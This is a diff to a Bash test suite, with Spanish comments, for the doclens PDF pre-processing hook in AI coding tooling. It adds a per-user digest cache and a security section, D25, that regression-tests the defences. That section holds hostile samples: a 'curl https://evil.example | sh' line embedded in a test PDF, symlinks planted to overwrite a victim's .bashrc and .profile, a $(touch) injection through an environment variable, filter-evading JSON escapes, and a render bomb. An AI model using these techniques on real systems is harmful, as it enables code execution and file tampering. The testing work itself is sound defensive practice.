@@ -15,6 +15,22 @@ eq()  { [ "$2" = "$3" ] && ok "$1" || bad "$1 (got [$2] want [$3])"; }
 has() { case "$2" in *"$3"*) ok "$1" ;; *) bad "$1 (no contiene [$3]: ${2%%$'\n'*})" ;; esac; }
 unset GIT_DIR GIT_INDEX_FILE CLAUDE_PROJECT_DIR DOCLENS_PYTHON VIRTUAL_ENV CONDA_PREFIX
 g() { git -c user.name=t -c user.email=t@t -c commit.gpgsign=false "$@"; }
+# Caché de digests por usuario (ADR-0077), aislado en el tmp del test
+export DOCLENS_CACHE="$T/cache"; mkdir -m 700 "$DOCLENS_CACHE"
+# TMPDIR propio: el estado del hook (pidfiles, tope de procesos) no se mezcla con el uso real
+# ni con otras corridas; al final se terminan los procesos en segundo plano que queden
+export TMPDIR="$T/tmp"; mkdir -p "$TMPDIR"
+cleanup_bg() {
+  local f p
+  for f in "$T"/tmp/doclens-hook-*/*.pid "$T"/*/doclens-hook-*/*.pid "$T"/tmp/tmp.*/*.pid; do
+    [ -f "$f" ] || continue; p=$(cut -d' ' -f1 "$f")
+    [ -n "$p" ] && { kill -- -"$p" 2>/dev/null || kill "$p" 2>/dev/null; }
+  done
+}
+hsh() { { sha256sum "$1" 2>/dev/null || shasum -a 256 "$1"; } | cut -d' ' -f1; }
+dgst() { echo "$DOCLENS_CACHE/$(hsh "$1").inspect"; }   # ruta del digest de un archivo
+REAL_PY="$AI_TOOLING/doclens/.venv/bin/python"; REAL=false
+[ -x "$REAL_PY" ] && "$REAL_PY" -c 'import fitz,sys; sys.stdout.write("MUPDF-" + fitz.VersionBind)' 2>/dev/null | grep -q '^MUPDF-' && REAL=true
 
 # ── stubs ─────────────────────────────────────────────────────────────────────
 export STUB="$T/stub-python" UVLOG="$T/uv.log"
@@ -26,8 +42,8 @@ case "$1" in
   -)  cat >/dev/null; echo "doclens: smoke OK — stub"; exit 0 ;;
   -m) exit 0 ;;
 esac
-d="$2.inspect"; mkdir -p "$d"; : > "$d/index.md"; : > "$d/downscaled.png"
-{ sha256sum "$2" 2>/dev/null || shasum -a 256 "$2"; } | cut -d' ' -f1 > "$d/.source"; echo "INSPECT_DIR=$d"
+h=$({ sha256sum "$2" 2>/dev/null || shasum -a 256 "$2"; } | cut -d' ' -f1)
+d="$DOCLENS_CACHE/$h.inspect"; mkdir -p "$d"; : > "$d/index.md"; : > "$d/downscaled.png"; echo "INSPECT_DIR=$d"
 EOF
 mkdir -p "$T/fakeuv"
 cat > "$T/fakeuv/uv" <<'EOF'
@@ -49,6 +65,7 @@ TB="$T/tb"; mkdir -p "$TB"
 done
 (cd "$TB" && g init -q && g add -A && g commit -qm tb) >/dev/null
 SYNC="$TB/doclens/sync.sh"
+cd "$T" || exit 1
 SRCLIST() { (cd "$TB/doclens" && git ls-files | LC_ALL=C sort); }
 
 consumer() {  # repo git nuevo; imprime su path (6 X: busybox)
@@ -171,11 +188,11 @@ eq "--force reintenta y crea" "$RC" 0
 [ ! -f "$C5/doclens/.venv.failed" ] && ok "éxito borra .venv.failed" || bad ".venv.failed quedó"
 
 echo "══ D11: doc-guard listo para usar — arranque perezoso, lock, fallo, DOCLENS_PYTHON ══"
-: > "$T/doc.pdf"
+echo "doc.pdf" > "$T/doc.pdf"
 C6=$(consumer); cp -R "$TB/doclens" "$C6/doclens"; rm -rf "$C6/doclens/.venv"
 R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*pre-procesado*) ok "sin venv: lo crea solo y procesa el PDF" ;; *) bad "arranque perezoso: ${R%%$'\n'*}" ;; esac
 [ -x "$C6/doclens/.venv/bin/python" ] && ok "doclens/.venv creado por doc-guard" || bad "doc-guard no creó el venv"
-rm -rf "$C6/doclens/.venv" "$T/doc.pdf.inspect"; mkdir "$C6/doclens/.venv.lock"
+rm -rf "$C6/doclens/.venv" "$(dgst "$T/doc.pdf")"; mkdir "$C6/doclens/.venv.lock"
 R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*"reintenta el Read"*) ok "lock tomado → 'reintenta' (no 2º arranque)" ;; *) bad "con lock: ${R%%$'\n'*}" ;; esac
 rmdir "$C6/doclens/.venv.lock"; date > "$C6/doclens/.venv.failed"
 R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*"bash doclens/sync.sh --force"*) ok "fallo reciente → mensaje manual con el comando" ;; *) bad "fallo reciente: ${R%%$'\n'*}" ;; esac
@@ -196,10 +213,13 @@ DOC=$(bash "$AI_TOOLING/scripts/harness-doctor.sh" "$C7" 2>&1)
 case "$DOC" in *"WARN: doclens"*) bad "doctor aún avisa: $(grep 'doclens' <<< "$DOC" | head -1)" ;; *) ok "doctor sin aviso de doclens" ;; esac
 
 echo "══ D13: motor real ══"
-if [ -x "$AI_TOOLING/doclens/.venv/bin/python" ] && "$AI_TOOLING/doclens/.venv/bin/python" -c 'import fitz' 2>/dev/null; then
+if $REAL; then
   "$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz,sys; d=fitz.open(); d.new_page().insert_text((72,72),'hola'); d.save(sys.argv[1])" "$T/real.pdf"
   "$AI_TOOLING/doclens/.venv/bin/python" "$AI_TOOLING/doclens/doclens.py" "$T/real.pdf" >/dev/null 2>&1
-  grep -qx '\*' "$T/real.pdf.inspect/.gitignore" 2>/dev/null && ok "el sidecar .inspect/ se ignora solo" || bad "sidecar sin .gitignore"
+  R1=$(dgst "$T/real.pdf")
+  [ -f "$R1/index.md" ] && [ ! -e "$T/real.pdf.inspect" ] && ok "digest en el caché por usuario, nada junto al PDF" || bad "digest fuera del caché"
+  [ "$(ls -ld "$R1" | cut -c1-10)" = drwx------ ] && [ "$(ls -l "$R1/index.md" | cut -c1-10)" = -rw------- ] \
+    && ok "digest privado (0700/0600)" || bad "permisos del digest: $(ls -ld "$R1" | cut -c1-10) $(ls -l "$R1/index.md" | cut -c1-10)"
   mkdir -p "$T/ro"; cp "$T/real.pdf" "$T/ro/r.pdf"; chmod 555 "$T/ro"
   OUT=$("$AI_TOOLING/doclens/.venv/bin/python" "$AI_TOOLING/doclens/doclens.py" "$T/ro/r.pdf" 2>/dev/null); chmod 755 "$T/ro"
   D="${OUT#*INSPECT_DIR=}"
@@ -244,9 +264,9 @@ stubvenv "$C10/doclens/.venv"
 OUT=$(env DOCLENS_PYTHON="$T/badpy/bin/python" bash "$SYNC" "$C10" 2>&1); RC=$?
 eq "DOCLENS_PYTHON sin dependencias → no falla (compatibilidad)" "$RC" 0
 has "avisa y usa doclens/.venv" "$OUT" "se usa doclens/.venv"
-: > "$T/d16.pdf"
+echo "d16.pdf" > "$T/d16.pdf"
 R=$(dg "$C10" "$T/d16.pdf" DOCLENS_PYTHON="$T/badpy/bin/python"); case "$R" in "2|"*pre-procesado*) ok "doc-guard: DOCLENS_PYTHON roto → usa doclens/.venv" ;; *) bad "doc-guard DOCLENS_PYTHON roto: ${R%%$'\n'*}" ;; esac
-rm -rf "$C10/doclens/.venv"; date > "$C10/doclens/.venv.failed"; rm -rf "$T/d16.pdf.inspect"
+rm -rf "$C10/doclens/.venv"; date > "$C10/doclens/.venv.failed"; rm -rf "$(dgst "$T/d16.pdf")"
 R=$(dg "$C10" "$T/d16.pdf" DOCLENS_PYTHON="$T/badpy/bin/python"); case "$R" in "2|"*"DOCLENS_PYTHON="*"no tiene las dependencias"*) ok "sin venv: el mensaje nombra DOCLENS_PYTHON" ;; *) bad "mensaje DOCLENS_PYTHON: ${R%%$'\n'*}" ;; esac
 rm -f "$C10/doclens/.venv.failed"
 
@@ -274,7 +294,7 @@ sh -c 'exit 0' & DEAD=$!; wait "$DEAD"
 mkdir "$C12/doclens/.venv.lock"; echo "$DEAD" > "$C12/doclens/.venv.lock/pid"
 env PATH="$UVPATH" bash "$C12/doclens/sync.sh" "$C12" --venv >/dev/null 2>&1; RC=$?
 eq "PID muerto → toma el lock y crea el venv" "$RC" 0
-rm -rf "$C12/doclens/.venv"; mkdir "$C12/doclens/.venv.lock"; echo "$DEAD" > "$C12/doclens/.venv.lock/pid"; : > "$T/d19.pdf"
+rm -rf "$C12/doclens/.venv"; mkdir "$C12/doclens/.venv.lock"; echo "$DEAD" > "$C12/doclens/.venv.lock/pid"; echo "d19.pdf" > "$T/d19.pdf"
 R=$(dg "$C12" "$T/d19.pdf"); case "$R" in "2|"*pre-procesado*) ok "doc-guard no espera 10 min por un lock huérfano" ;; *) bad "lock huérfano en doc-guard: ${R%%$'\n'*}" ;; esac
 
 echo "══ D20: doc-guard nunca alcanza el timeout del hook (fail-open) ══"
@@ -285,7 +305,7 @@ cat > "$C13/doclens/.venv/bin/python" <<EOF
 echo x >> "$T/slow.calls"; sleep 4
 d="\$2.inspect"; mkdir -p "\$d"; : > "\$d/index.md"; echo "INSPECT_DIR=\$d"
 EOF
-chmod +x "$C13/doclens/.venv/bin/python"; : > "$T/grande.pdf"; : > "$T/slow.calls"
+chmod +x "$C13/doclens/.venv/bin/python"; echo "grande.pdf" > "$T/grande.pdf"; : > "$T/slow.calls"
 S0=$SECONDS; R=$(dg "$C13" "$T/grande.pdf" DOCLENS_HOOK_WAIT=1); EL=$((SECONDS - S0))
 case "$R" in "2|"*"reintenta el Read"*) ok "documento lento → bloquea con 'reintenta' (exit 2)" ;; *) bad "lento: ${R%%$'\n'*}" ;; esac
 [ "$EL" -le 3 ] && ok "respeta el plazo (${EL}s, no espera al proceso)" || bad "esperó ${EL}s"
@@ -297,17 +317,17 @@ R=$(dg "$C13" "$T/grande.pdf"); case "$R" in "2|"*pre-procesado*) ok "al termina
 echo "══ D21: falla del ARCHIVO (no del venv) → mensaje correcto, sin reinstalar ══"
 C14=$(consumer); mkdir -p "$C14/doclens/.venv/bin"; : > "$C14/doclens/doclens.py"; cp "$SYNC" "$C14/doclens/sync.sh"
 printf '#!/bin/sh\n[ "$1" = -c ] && exit 0\necho "RuntimeError: cannot open broken document" >&2; exit 1\n' > "$C14/doclens/.venv/bin/python"
-chmod +x "$C14/doclens/.venv/bin/python"; : > "$T/danado.pdf"; : > "$UVLOG"
+chmod +x "$C14/doclens/.venv/bin/python"; echo "danado.pdf" > "$T/danado.pdf"; : > "$UVLOG"
 R=$(dg "$C14" "$T/danado.pdf"); case "$R" in "2|"*"no pudo procesar este archivo"*"cannot open broken"*) ok "dice que el archivo falló (con el error de doclens)" ;; *) bad "archivo dañado: ${R%%$'\n'*}" ;; esac
 [ ! -s "$UVLOG" ] && ok "no intenta reinstalar el venv" || bad "relanzó la creación del venv"
 
 echo "══ D22: sin jq, PDF dentro de *.inspect/, toolbox sin git ══"
 mkdir -p "$T/nojq"; for b in grep cat; do ln -sf "$(command -v $b)" "$T/nojq/$b"; done
 R=$(echo '{"tool_name":"Read","tool_input":{"file_path":"/x/a.pdf"}}' | PATH="$T/nojq" "$BASH" "$H/doc-guard.sh" 2>&1 >/dev/null; echo "|$?")
-case "$R" in *"falta jq"*"|2") ok "sin jq: el PDF se bloquea igual" ;; *) bad "sin jq: [$R]" ;; esac
+case "$R" in *"jq"*"|2") ok "sin jq: el PDF se bloquea igual" ;; *) bad "sin jq: [$R]" ;; esac
 R=$(echo '{"tool_name":"Read","tool_input":{"file_path":"/x/a.md"}}' | PATH="$T/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
 eq "sin jq: lo que no es PDF pasa" "$R" 0
-mkdir -p "$T/rep.inspect/raw"; : > "$T/rep.inspect/raw/x.pdf"
+mkdir -p "$T/rep.inspect/raw"; echo "rep.inspect/raw/x.pdf" > "$T/rep.inspect/raw/x.pdf"
 R=$(dg "$C1" "$T/rep.inspect/raw/x.pdf"); case "$R" in "2|"*) ok "PDF real dentro de *.inspect/ → se intercepta" ;; *) bad "PDF en .inspect pasó: ${R%%|*}" ;; esac
 eq "md dentro de *.inspect/ → libre" "$(dg "$C1" "$T/rep.inspect/index.md" | cut -d'|' -f1)" 0
 mkdir -p "$T/tbfs"; (cd "$TB" && git archive HEAD doclens) | tar -xf - -C "$T/tbfs"
@@ -317,7 +337,7 @@ C15=$(consumer); stubvenv "$C15/doclens/.venv"; bash "$T/tbfs/doclens/sync.sh" "
   && ok "toolbox sin git: copia sin basura (.DS_Store, *.orig, caches)" || bad "copió basura: $(cd "$C15/doclens" && ls -a | tr '\n' ' ')"
 
 echo "══ D23: regresiones de la 3ª validación (estado, rendimiento, nombres, compatibilidad) ══"
-C16=$(consumer); stubvenv "$C16/doclens/.venv"; bash "$SYNC" "$C16" >/dev/null 2>&1; : > "$T/d23.pdf"
+C16=$(consumer); stubvenv "$C16/doclens/.venv"; bash "$SYNC" "$C16" >/dev/null 2>&1; echo "d23.pdf" > "$T/d23.pdf"
 TD="$T/tmpd"; mkdir -p "$TD"; SD="$TD/doclens-hook-$(id -u)"
 R=$(dg "$C16" "$T/d23.pdf" TMPDIR="$TD"); case "$R" in "2|"*pre-procesado*) ok "PDF procesado" ;; *) bad "d23: ${R%%$'\n'*}" ;; esac
 [ -z "$(ls "$SD" 2>/dev/null)" ] && ok "no deja .out/.pid tras terminar" || bad "quedó estado: $(ls "$SD" | tr '\n' ' ')"
@@ -327,9 +347,9 @@ rm -f "$SD"/*; chmod 500 "$SD"   # vacía: un .out previo sí se podría sobresc
 R=$(dg "$C16" "$T/d23.pdf" TMPDIR="$TD"); chmod 700 "$SD"; case "$R" in "2|"*pre-procesado*) ok "carpeta de estado sin escritura → usa un temporal propio" ;; *) bad "estado no escribible: ${R%%$'\n'*}" ;; esac
 REF2="$T/d23ref"; sleep 1; : > "$REF2"; sleep 1; echo cambio >> "$T/d23.pdf"; touch -t 202001010000 "$T/d23.pdf"
 dg "$C16" "$T/d23.pdf" >/dev/null
-[ -n "$(find "$T/d23.pdf.inspect/index.md" -newer "$REF2")" ] && ok "contenido nuevo con fecha VIEJA → se reprocesa (caché por contenido)" || bad "sirvió un digest viejo"
+[ -n "$(find "$(dgst "$T/d23.pdf")/index.md" -newer "$REF2" 2>/dev/null)" ] && ok "contenido nuevo con fecha VIEJA → se reprocesa (caché por contenido)" || bad "sirvió un digest viejo"
 REF3="$T/d23ref3"; sleep 1; : > "$REF3"; sleep 1; touch "$T/d23.pdf"; dg "$C16" "$T/d23.pdf" >/dev/null
-[ -z "$(find "$T/d23.pdf.inspect/index.md" -newer "$REF3")" ] && ok "solo cambia la fecha (mismo contenido) → no reprocesa" || bad "reprocesó sin cambio de contenido"
+[ -z "$(find "$(dgst "$T/d23.pdf")/index.md" -newer "$REF3")" ] && ok "solo cambia la fecha (mismo contenido) → no reprocesa" || bad "reprocesó sin cambio de contenido"
 : > "$UVLOG"; mv "$C16/doclens/.venv" "$C16/doclens/.venv-off"
 R=$(dg "$C16" "$T/d23.pdf"); mv "$C16/doclens/.venv-off" "$C16/doclens/.venv"
 case "$R" in "2|"*pre-procesado*) ok "digest vigente → respuesta directa, sin lanzar procesos ni venv" ;; *) bad "camino rápido: ${R%%$'\n'*}" ;; esac
@@ -353,8 +373,8 @@ OUT=$(env DOCLENS_PYTHON=python3-no-existe PATH="$UVPATH" bash "$SYNC" "$C16" 2>
 eq "DOCLENS_PYTHON inexistente → no falla (usa el venv)" "$RC" 0
 
 echo "══ D24: validación final — proceso largo, respaldos, motor real ══"
-C19=$(consumer); stubvenv "$C19/doclens/.venv"; bash "$SYNC" "$C19" >/dev/null 2>&1; : > "$T/d24.pdf"
-TD3="$T/tmpd3"; mkdir -p "$TD3/doclens-hook-$(id -u)"; KEY=$(printf '%s' "$T/d24.pdf" | cksum | cut -d' ' -f1)
+C19=$(consumer); stubvenv "$C19/doclens/.venv"; bash "$SYNC" "$C19" >/dev/null 2>&1; echo "d24.pdf" > "$T/d24.pdf"
+TD3="$T/tmpd3"; mkdir -p "$TD3"; mkdir -m 700 "$TD3/doclens-hook-$(id -u)"; KEY=$(printf '%s' "$T/d24.pdf" | cksum | cut -d' ' -f1)
 sh -c ': doclens-bg; sleep 30; :' doclens-bg & BG=$!   # compuesto: sh no hace exec directo a sleep
 echo "$BG $(( $(date +%s) - 4000 ))" > "$TD3/doclens-hook-$(id -u)/$KEY.pid"
 R=$(dg "$C19" "$T/d24.pdf" TMPDIR="$TD3"); case "$R" in "2|"*"probablemente está colgado"*) ok "proceso nuestro > 1 h → 'colgado' + ruta manual (sin bucle de reintentos)" ;; *) bad "colgado: ${R%%$'\n'*}" ;; esac
@@ -370,17 +390,17 @@ echo local >> "$CB2/doclens/README.md"; echo "// v3" >> "$TB/doclens/adapters/op
 bash "$SYNC" "$CB2" >/dev/null 2>&1
 ls "$CB2"/.claude/.harness-backup-*-doclens/doclens/README.md >/dev/null 2>&1 && ok "un cambio local sí se respalda" || bad "perdió un cambio local sin respaldo"
 RP="$AI_TOOLING/doclens/.venv/bin/python"
-if [ -x "$RP" ] && "$RP" -c 'import fitz' 2>/dev/null; then
+if $REAL; then
   C20=$(consumer); bash "$SYNC" "$C20" --check >/dev/null; env DOCLENS_PYTHON="$RP" bash "$SYNC" "$C20" >/dev/null 2>&1
   mkpdf() { "$RP" -c "import fitz,sys; d=fitz.open(); [d.new_page().insert_text((72,72),sys.argv[2]) for _ in range(int(sys.argv[3]))]; d.save(sys.argv[1])" "$1" "$2" "$3"; }
   mkpdf "$T/v.pdf" "VERSION DOS" 3; dg "$C20" "$T/v.pdf" DOCLENS_PYTHON="$RP" >/dev/null
   mkpdf "$T/v-new.pdf" "VERSION TRES" 1; touch -t 202001010000 "$T/v-new.pdf"; mv "$T/v-new.pdf" "$T/v.pdf"
   dg "$C20" "$T/v.pdf" DOCLENS_PYTHON="$RP" >/dev/null
-  [ "$(grep -c 'VERSION TRES' "$T/v.pdf.inspect/index.md")" -ge 1 ] && ok "motor real: PDF reemplazado con fecha vieja → digest nuevo" || bad "motor real sirvió el digest viejo"
-  [ ! -e "$T/v.pdf.inspect/pages/page-2.png" ] && ok "motor real: páginas que ya no existen se borran" || bad "quedaron pages/ viejas"
+  [ "$(grep -c 'VERSION TRES' "$(dgst "$T/v.pdf")/index.md")" -ge 1 ] && ok "motor real: PDF reemplazado con fecha vieja → digest nuevo" || bad "motor real sirvió el digest viejo"
+  [ ! -e "$(dgst "$T/v.pdf")/pages/page-2.png" ] && ok "motor real: páginas que ya no existen se borran" || bad "quedaron pages/ viejas"
   "$RP" -c "from PIL import Image; Image.new('RGB',(40,40),'red').save('$T/img.pdf', format='PNG')"
   R=$(dg "$C20" "$T/img.pdf" DOCLENS_PYTHON="$RP"); case "$R" in "2|"*"es en realidad una imagen"*as-image.png*) ok "imagen con extensión .pdf → apunta a as-image.png" ;; *) bad "imagen .pdf: ${R%%$'\n'*}" ;; esac
-  [ -f "$T/img.pdf.inspect/as-image.png" ] && ok "as-image.png existe" || bad "sin as-image.png"
+  [ -f "$(dgst "$T/img.pdf")/as-image.png" ] && ok "as-image.png existe" || bad "sin as-image.png"
   "$RP" -c "import fitz; d=fitz.open(); d.new_page().insert_text((72,72),'x'); d.save('$T/pw.pdf', encryption=fitz.PDF_ENCRYPT_AES_256, user_pw='u', owner_pw='o')"
   R=$(dg "$C20" "$T/pw.pdf" DOCLENS_PYTHON="$RP"); case "$R" in "2|"*"contraseña de apertura"*) ok "PDF con contraseña → mensaje claro" ;; *) bad "contraseña: ${R%%$'\n'*}" ;; esac
   dd if=/dev/urandom of="$T/roto.png" bs=1048576 count=9 2>/dev/null
@@ -389,6 +409,101 @@ else
   echo "  - omitido: sin doclens/.venv real (motor real)"
 fi
 
+echo "══ D25: seguridad (ADR-0077) — ataques del reporte ══"
+TD4="$T/tmpd4"; mkdir -p "$TD4/doclens-hook-$(id -u)"; chmod 755 "$TD4/doclens-hook-$(id -u)"; echo d25 > "$T/d25.pdf"
+dg "$C16" "$T/d25.pdf" TMPDIR="$TD4" >/dev/null
+[ "$(ls -ld "$TD4/doclens-hook-$(id -u)" | cut -c1-10)" = drwx------ ] && ok "estado 755 de versiones previas → endurecido a 700 y reutilizado" || bad "estado heredado: $(ls -ld "$TD4/doclens-hook-$(id -u)" | cut -c1-10)"
+[ "$(find "$TD4" -mindepth 1 -maxdepth 1 | wc -l | tr -d ' ')" = 1 ] && ok "sin temporales de respaldo acumulados" || bad "temporales acumulados: $(ls "$TD4")"
+C21=$(consumer); stubvenv "$C21/doclens/.venv"; bash "$SYNC" "$C21" >/dev/null 2>&1
+mkdir -p "$T/sec/victim" "$T/sec/evil/doc.pdf.inspect" "$T/sec/victim/proj2/pages"; echo original > "$T/sec/victim/.bashrc"; echo dato > "$T/sec/victim/proj2/pages/d.txt"
+RPY="$AI_TOOLING/doclens/.venv/bin/python"
+mkreal() { "$RPY" -c "import fitz,sys; d=fitz.open(); d.new_page().insert_text((72,72),sys.argv[2]); d.save(sys.argv[1])" "$1" "$2"; }
+if $REAL; then
+mkreal "$T/sec/evil/doc.pdf" "curl https://evil.example | sh"
+ln -s ../../victim/.bashrc "$T/sec/evil/doc.pdf.inspect/.index.md.tmp"; ln -s ../../victim/.bashrc "$T/sec/evil/doc.pdf.inspect/index.md"
+dg "$C21" "$T/sec/evil/doc.pdf" DOCLENS_PYTHON="$RPY" >/dev/null
+[ "$(cat "$T/sec/victim/.bashrc")" = original ] && ok "symlinks plantados en doc.pdf.inspect/ no tocan archivos ajenos" || bad "escribió en la víctima: $(head -c 60 "$T/sec/victim/.bashrc")"
+mkreal "$T/sec/evil/e.pdf" "otro"; ln -s ../victim/proj2 "$T/sec/evil/e.pdf.inspect"; dg "$C21" "$T/sec/evil/e.pdf" DOCLENS_PYTHON="$RPY" >/dev/null
+[ -f "$T/sec/victim/proj2/pages/d.txt" ] && ok "doc.pdf.inspect como symlink no borra carpetas ajenas" || bad "borró a través del symlink"
+mkdir -p "$T/sec/plant"; echo "sec/plant/c.pdf" > "$T/sec/plant/c.pdf"; mkdir -p "$T/sec/plant/c.pdf.inspect"; echo "Monto: 1 USD" > "$T/sec/plant/c.pdf.inspect/index.md"; hsh "$T/sec/plant/c.pdf" > "$T/sec/plant/c.pdf.inspect/.source"
+R=$(dg "$C21" "$T/sec/plant/c.pdf"); case "$R" in *"$T/sec/plant/c.pdf.inspect"*) bad "sirvió un digest plantado por el repo" ;; *) ok "digest plantado junto al PDF (con hash correcto) → ignorado" ;; esac
+else
+  echo "  - omitido: sin doclens/.venv real (ataques de symlink al sidecar)"
+fi
+if command -v node >/dev/null 2>&1; then
+  OC=$(sed -n '/const out = execFileSync(/,/).toString()/p' "$AI_TOOLING/.opencode/plugins/guards.ts")
+  case "$OC" in *'execFileSync('*'String(args.filePath)'*) ok "guard de OpenCode usa execFileSync con argumentos en lista" ;; *) bad "guard de OpenCode: $OC" ;; esac
+  # multilínea: ningún execSync/exec con template string que interpole filePath
+  BAD=$(python3 - "$AI_TOOLING/.opencode/plugins/guards.ts" "$AI_TOOLING/doclens/adapters/opencode/guards-snippet.ts" <<'PY'
+import re, sys
+for f in sys.argv[1:]:
+    src = open(f).read()
+    for m in re.finditer(r"\bexec(?:Sync)?\(\s*`[^`]*\$\{[^}]*filePath", src, re.S):
+        print(f"{f}:{src.count(chr(10), 0, m.start()) + 1}")
+PY
+)
+  [ -z "$BAD" ] && ok "ningún exec/execSync con string de shell que interpole filePath" || bad "inyección posible en: $BAD"
+else
+  echo "  - omitido: sin node"
+fi
+NL="$T/sec/nl"; mkdir -p "$NL"; F=$(printf '%s/a.txt\nb.pdf' "$NL"); : > "$F"
+R=$(printf '{"tool_name":"Read","tool_input":{"file_path":%s}}' "$(printf '%s' "$F" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')" | (env CLAUDE_PROJECT_DIR="$C21" PATH="$UVPATH" bash "$H/doc-guard.sh" >/dev/null 2>&1; echo $?))
+eq "nombre con salto de línea 'a.txt<NL>b.pdf' → interceptado" "$R" 2
+mkdir -p "$T/sec/nojq" "$T/sec/sinjq"
+for b in grep cat tr python3; do ln -sf "$(command -v $b)" "$T/sec/nojq/$b"; done
+for d in /usr/bin /bin; do for b in "$d"/*; do n=${b##*/}; [ "$n" = jq ] || [ -e "$T/sec/sinjq/$n" ] || ln -s "$b" "$T/sec/sinjq/$n"; done; done
+ln -sf "$(command -v python3)" "$T/sec/sinjq/python3"
+# sin jq pero con python3 real: /usr/bin y /bin no traen jq en macOS (en Linux puede estar: entonces usa jq)
+R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/q\"x.pdf"}}' | PATH="$T/sec/sinjq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
+eq "sin jq: comilla escapada q\\\"x.pdf → bloqueado" "$R" 2
+R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.\u0070df"}}' | PATH="$T/sec/sinjq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
+eq "sin jq: escape \\u0070df → bloqueado" "$R" 2
+rm -f "$T/sec/nojq/python3"; printf '#!/bin/sh\nexit 1\n' > "$T/sec/nojq/python3"; chmod +x "$T/sec/nojq/python3"
+R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.pdf"}}' | PATH="$T/sec/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
+eq "sin jq y python3 roto → bloqueado (no fail-open)" "$R" 2
+rm -f "$T/sec/nojq/python3"
+R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.\u0070df"}}' | PATH="$T/sec/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
+eq "sin jq ni python3: escape → bloqueado (fail-closed)" "$R" 2
+CB3="$T/sec/cache-abierto"; mkdir -m 777 "$CB3"; echo "sec/k.pdf" > "$T/sec/k.pdf"
+R=$(dg "$C21" "$T/sec/k.pdf" DOCLENS_CACHE="$CB3" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
+if $REAL; then
+  case "$R" in "2|"*"caché inseguro"*) ok "caché con permisos 0777 → rechazado (motor real)" ;; *) bad "caché 0777: ${R%%$'\n'*}" ;; esac
+  ln -s "$T/sec/victim" "$T/sec/cache-link"
+  R=$(dg "$C21" "$T/sec/k.pdf" DOCLENS_CACHE="$T/sec/cache-link" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
+  case "$R" in "2|"*"caché inseguro"*) ok "caché como symlink → rechazado" ;; *) bad "caché symlink: ${R%%$'\n'*}" ;; esac
+  ln -s /dev/zero "$T/sec/z.pdf"; S0=$SECONDS
+  R=$(dg "$C21" "$T/sec/z.pdf" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
+  case "$R" in "2|"*"no es un archivo regular"*) ok "symlink a /dev/zero → rechazado" ;; *) bad "/dev/zero: ${R%%$'\n'*}" ;; esac
+  [ $((SECONDS - S0)) -le 5 ] && ! ps -axo args 2>/dev/null | grep -q "[d]oclens.py $T/sec/z.pdf" && ok "sin proceso colgado leyendo /dev/zero" || bad "proceso colgado con /dev/zero"
+  "$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz; d=fitz.open(); [d.new_page(width=7200, height=7200) for _ in range(3)]; d.save('$T/sec/bomba.pdf')"
+  R=$(dg "$C21" "$T/sec/bomba.pdf" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
+  B=$(dgst "$T/sec/bomba.pdf")
+  case "$R" in "2|"*pre-procesado*) PX=$("$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz; p=fitz.Pixmap('$B/pages/page-1.png'); print(p.width*p.height)")
+    [ "$PX" -le 40000000 ] && ok "bomba de render (7200 pt) → acotada a ≤ 40 Mpx ($PX)" || bad "render sin acotar: $PX px" ;;
+    *) bad "bomba: ${R%%$'\n'*}" ;; esac
+else
+  echo "  - omitido: sin doclens/.venv real (caché inseguro, /dev/zero, bomba de render)"
+fi
+R=$(dg "$C21" "$T/d23.pdf" 'DOCLENS_HOOK_WAIT=x[$(touch '"$T/sec/WAITPWN"')]' TMPDIR="$T/sec")
+[ ! -e "$T/sec/WAITPWN" ] && ok "DOCLENS_HOOK_WAIT con \$(cmd) → no ejecuta" || bad "DOCLENS_HOOK_WAIT ejecutó código"
+mkdir -p "$T/sec/tmpvictim" "$T/sec/tmpd"; ln -s "$T/sec/tmpvictim" "$T/sec/tmpd/doclens-hook-$(id -u)"
+echo d25b > "$T/d25b.pdf"; VKEY=$(printf '%s' "$T/d25b.pdf" | cksum | cut -d' ' -f1)
+# el .out tiene nombre predecible: el código viejo lo escribía y BORRABA a través del symlink
+echo valioso > "$T/sec/tmpvictim/$VKEY.out"; echo valioso > "$T/sec/tmpvictim/notas-2020.txt"; touch -t 202001010000 "$T/sec/tmpvictim/notas-2020.txt"
+dg "$C21" "$T/d25b.pdf" TMPDIR="$T/sec/tmpd" >/dev/null
+[ "$(cat "$T/sec/tmpvictim/$VKEY.out" 2>/dev/null)" = valioso ] && [ -f "$T/sec/tmpvictim/notas-2020.txt" ] && ok "estado del hook como symlink → no se usa (ni escribe ni purga a través de él)" || bad "tocó la víctima: [$(ls "$T/sec/tmpvictim" | tr '\n' ' ')]"
+C22=$(consumer); cp -R "$TB/doclens" "$C22/doclens"; rm -rf "$C22/doclens/.venv"; echo intacto > "$T/sec/victim/.profile"
+ln -s "$T/sec/victim/.profile" "$C22/doclens/.venv.failed"
+printf '#!/bin/sh\nexit 1\n' > "$T/sec/failuv"; mkdir -p "$T/sec/failbin"; cp "$T/sec/failuv" "$T/sec/failbin/uv"; chmod +x "$T/sec/failbin/uv"; ln -sf "$STUB" "$T/sec/failbin/python3"
+env PATH="$T/sec/failbin:$PATH" bash "$C22/doclens/sync.sh" "$C22" --force >/dev/null 2>&1
+[ "$(cat "$T/sec/victim/.profile")" = intacto ] && ok ".venv.failed como symlink → la víctima queda intacta" || bad "escribió en .profile"
